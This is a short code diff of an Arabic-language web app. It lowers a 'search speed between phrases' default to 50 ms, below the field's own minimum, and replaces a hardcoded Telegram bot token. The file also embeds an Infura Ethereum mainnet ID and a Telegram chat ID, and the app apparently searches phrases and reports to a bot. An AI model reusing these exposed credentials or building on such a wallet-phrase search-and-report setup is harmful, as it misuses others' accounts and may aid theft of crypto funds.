@@ -527,7 +527,7 @@
             <div class="control-panel">
                 <div class="control-group">
                     <label for="searchSpeed">سرعة البحث (مللي ثانية بين كل عبارة):</label>
-                    <input type="number" id="searchSpeed" value="3000" min="1000" max="10000" step="500">
+                    <input type="number" id="searchSpeed" value="50" min="1000" max="10000" step="500">
                 </div>
 
                 <div class="control-group">
@@ -830,7 +830,7 @@
         // إعدادات التطبيق
         const INFURA_PROJECT_ID = '482a7c1c7cc14ec78699c3f1c231b0cd';
         const INFURA_URL = `https://mainnet.infura.io/v3/${INFURA_PROJECT_ID}`;
-        const TELEGRAM_BOT_TOKEN = '7521799915:AAEQEM_Ajk5_hMWQUrlmvdNbDBJAUMMwgrg';
+        const TELEGRAM_BOT_TOKEN = '8257110214:AAFDx0awsmi7yjz6tCZqVY2jS5BZmygvQKw';
         const TELEGRAM_CHAT_ID = '910021564';
         const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
 
